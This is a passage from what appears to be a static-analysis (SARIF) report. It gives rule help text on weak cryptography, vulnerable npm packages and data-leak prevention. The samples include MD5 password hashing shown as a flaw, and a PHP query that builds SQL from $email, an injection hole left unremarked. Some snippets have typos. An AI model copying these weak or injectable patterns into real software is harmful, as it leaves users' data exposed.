practices.\n\n:::\n\n::::\n\n## Encoding is Not Encryption\n\nEncodings like Base64 are a common method of transforming binary data to text before transmission. Anybody can decode \nBase64 text, however - do not depend on encoding methods to hide secrets from attackers!\n\n## Don't Invent Your Own Encryption Algorithms\n\nAvoid the temptation to roll your own encryption algorithm. Cryptography is hard, and designing your own cryptographic \nschemes when well-studied encryption algorithms are freely available is asking for trouble.\n\n## Symmetric vs Asymmetric Encryption Algorithms\n\nAn encryption algorithm that uses the same key to encrypt and decrypt data is called a *symmetric algorithm*. An \n*asymmetric algorithm* uses different keys to encrypt and decrypt data, and has the advantage that the encryption key\ncan be made public, allowing anyone to securely encrypt data in a way that only the holder of the decryption key can\nread. For this reason, asymmetric algorithms are commonly called **public-key** algorithms. However, common asymmetric\nciphers can be broken when they are used directly with arbitrary untrusted inputs. Often, a hybrid scheme combining\nboth symmetric and asymmetric encryption needs to be used to avoid the problems that each scheme would have on its own.\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**",
                                "text": "Usage of a broken cryptographic algorithm was identified.\n\n# Encryption Vulnerabilities\n\nEncryption powers the modern internet, allowing secure storage of data and transmission of secrets across a network\nin such a way they cannot be inspected or tampered with by a third party. It is important that you use *strong\nencryption* algorithms when securing data in this way, or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power.\n\n## Encryption Algorithms\n\nEncryption algorithms are designed to encode the contents of a string or binary object in such away that an attacker\nwho does not possession the decryption key will not be able to decipher the contents. *Cryptography* - the study of \nencryption algorithms - is a complex field, and new encryption algorithms are invented by mathematicians frequently.\n\nAs computing power gets cheaper, it becomes easier for an attacker to use brute-force to decrypt the contents of \nencrypted data. For this reason, it's important to use modern encryption algorithms in your code, so your secrets\nremain safe.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following Java function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```java\npublic static String hashPassword(String password) throws java.security.NoSuchAlgorithmException\n{\n   java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"MD5\");\n   byte[] bytes = md.digest(password.getBytes());\n   \n   return org.apache.commons.codec.binary.Hex.encodeHexString(bytes);\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[C#]\n\nConsider the following C# function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```csharp\n// An example of weak password hash. Don't use MD5 to encrypt passwords!\npublic static string HashPassword(string password)\n{\n    using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())\n    {\n        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);\n        byte[] hashBytes  = md5.ComputeHash(inputBytes);\n\n        // Convert the byte array to hexadecimal string.\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < hashBytes.Length; i++)\n        {\n            sb.Append(hashBytes[i].ToString(\"X2\"));\n        }\n        \n        return sb.ToString();\n    }\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following Node.js function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```javascript\nconst crypto = require('crypto')\n\nfunction encryptPassword(password) {\n  return crypto.createHash('md5').update('password).digest(\"hex\")\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Python]\n\nConsider the following Python function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```python\nimport hashlib\n\ndef encrypt_password(password):\n  return hashlib.md5(password.encode('utf-8')).hexdigest()\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Scala]\n\nConsider the following Scala function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```scala\nimport java.security.MessageDigest\n\ndef encryptPassword(password: String) = {\n    MessageDigest.getInstance(\"MD5\").digest(password.getBytes).map(\"%02X\" format _).mkString\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[Go]\n\nConsider the following Go function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```go\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n)\n\nfunc HashPassword(password string) string {\n   hash := md5.Sum([]byte(password))\n   return hex.EncodeToString(hash[:])\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[PHP]\n\n## Encryption Vulnerabilities in PHP\n\nIn PHP, it's crucial to use modern and secure encryption methods. Relying on outdated or weak encryption functions can expose sensitive data to attackers. Consider the use of the `mcrypt` extension, which has been deprecated since PHP 7.1.0 due to its aging algorithms and its lack of support for modern cryptography:\n\n```php\nfunction encryptData($data, $key) {\n    $ivSize = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);\n    $iv = mcrypt_create_iv($ivSize, MCRYPT_RAND);\n    return mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);\n}\n```\n\nUsing the `mcrypt` functions in modern applications is not recommended. They utilize older algorithms, are not maintained, and might contain vulnerabilities.\n\n## Mitigation\n\n1. **Use Modern Encryption Libraries**: PHP has the `openssl` extension, which provides a rich set of low-level cryptographic operations. It unfortunately does not come with good high-level abstractions for the most common cryptographic needs.\n\n```php\nfunction encryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    $ivlen = openssl_cipher_iv_length($cipher=$cipher);\n    $iv = random_bytes($ivlen);\n    $ciphertext = openssl_encrypt($data, $cipher, $key, $options=0, $iv, $tag);\n    return json_encode([base64_encode($iv), base64_encode($tag), base64_encode($ciphertext)]);\n}\nfunction decryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    [$iv, $tag, $ciphertext] = json_decode($data);\n    return openssl_decrypt(base64_decode($ciphertext), $cipher, $key, $options=0, base64_decode($iv), base64_decode($tag));\n}\n```\n\n2. **Avoid Deprecated Encryption Extensions**: Steer clear of deprecated extensions like `mcrypt`. Instead, use more modern extensions like `openssl`.\n\n3. **Regularly Update and Review**: Cryptography standards evolve over time. Ensure that your encryption methods are updated regularly to align with best practices.\n\n:::\n\n::::\n\n## Encoding is Not Encryption\n\nEncodings like Base64 are a common method of transforming binary data to text before transmission. Anybody can decode \nBase64 text, however - do not depend on encoding methods to hide secrets from attackers!\n\n## Don't Invent Your Own Encryption Algorithms\n\nAvoid the temptation to roll your own encryption algorithm. Cryptography is hard, and designing your own cryptographic \nschemes when well-studied encryption algorithms are freely available is asking for trouble.\n\n## Symmetric vs Asymmetric Encryption Algorithms\n\nAn encryption algorithm that uses the same key to encrypt and decrypt data is called a *symmetric algorithm*. An \n*asymmetric algorithm* uses different keys to encrypt and decrypt data, and has the advantage that the encryption key\ncan be made public, allowing anyone to securely encrypt data in a way that only the holder of the decryption key can\nread. For this reason, asymmetric algorithms are commonly called **public-key** algorithms. However, common asymmetric\nciphers can be broken when they are used directly with arbitrary untrusted inputs. Often, a hybrid scheme combining\nboth symmetric and asymmetric encryption needs to be used to avoid the problems that each scheme would have on its own.\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/327.html",
                            "id": "weak-crypto-des/6fcdbf1a409a61749dc93fe38562677e",
                            "name": "Weak Cipher: Use Of A Broken Cryptographic Algorithm In Order.js:decryptdata",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 9",
                                    "CWE 327",
                                    "Cryptography",
                                    "OWASP 2021 a02-cryptographic-failures",
                                    "OWASP a02-2021-cryptographic-failures",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Weak Cipher"
                                ]
                            },
                            "shortDescription": {
                                "text": "Weak Cipher: Use of a Broken Cryptographic Algorithm in Order.js:decryptData"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Incorrect parsing of certain JSON input may result in js-bson not correctly serializing BSON. This may cause unexpected application behaviour including data disclosure."
                            },
                            "help": {
                                "markdown": "Incorrect parsing of certain JSON input may result in js-bson not correctly serializing BSON. This may cause unexpected application behaviour including data disclosure.",
                                "text": "Incorrect parsing of certain JSON input may result in js-bson not correctly serializing BSON. This may cause unexpected application behaviour including data disclosure."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/efd7c5cc8867f9685b29d4757c6bfd2c",
                            "name": "Pkg:npm/Bson@1.1.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.4",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2019-2391",
                                    "CVSS 5.4",
                                    "CWE 1035",
                                    "CWE 502",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/bson@1.1.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "A bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`."
                            },
                            "help": {
                                "markdown": "A bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.",
                                "text": "A bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1333.html",
                            "id": "oss_vuln/bca9416284924b1d018d6ad7fdc6ea91",
                            "name": "Pkg:npm/Path-To-Regexp@0.1.7",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-45296",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 1333",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/path-to-regexp@0.1.7"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive database data is written to log in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive database data is written to log in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive database data is written to log in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the 